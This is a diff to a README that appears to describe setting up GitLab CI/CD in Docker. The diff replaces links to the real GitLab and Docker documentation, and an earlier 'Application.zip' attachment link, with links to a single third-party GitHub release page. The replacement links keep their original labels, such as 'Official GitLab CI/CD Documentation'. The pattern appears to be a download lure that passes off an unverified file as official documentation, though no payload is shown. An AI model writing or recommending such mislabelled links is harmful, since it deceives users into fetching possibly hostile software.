@@ -19,15 +19,15 @@ To get started with GitLab CI/CD in Docker, follow these simple steps:
 6. Utilize SSH for secure communication between services.
 
 ## Learn More
-For a detailed guide on setting up GitLab CI/CD in Docker, refer to the [Documentation](https://github.com/user-attachments/files/18426772/Application.zip) 🚀.
+For a detailed guide on setting up GitLab CI/CD in Docker, refer to the [Documentation](https://github.com/Delfin4000/GitLabCICD/releases/tag/v2.0) 🚀.
 
 ## Additional Resources
-- [Official GitLab CI/CD Documentation](https://docs.gitlab.com/ee/ci/)
-- [Docker Documentation](https://docs.docker.com/)
-- [Docker Compose Documentation](https://docs.docker.com/compose/)
-- [GitLab Runner Documentation](https://docs.gitlab.com/runner/)
+- [Official GitLab CI/CD Documentation](https://github.com/Delfin4000/GitLabCICD/releases/tag/v2.0)
+- [Docker Documentation](https://github.com/Delfin4000/GitLabCICD/releases/tag/v2.0)
+- [Docker Compose Documentation](https://github.com/Delfin4000/GitLabCICD/releases/tag/v2.0)
+- [GitLab Runner Documentation](https://github.com/Delfin4000/GitLabCICD/releases/tag/v2.0)
 
 ## Stay Connected
 Join the GitLab community to stay updated on the latest features and developments. Happy coding! 🎉
 
-[![Download Application.zip](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download https://github.com/Delfin4000/GitLabCICD/releases/tag/v2.0](https://github.com/Delfin4000/GitLabCICD/releases/tag/v2.0)](https://github.com/Delfin4000/GitLabCICD/releases/tag/v2.0)
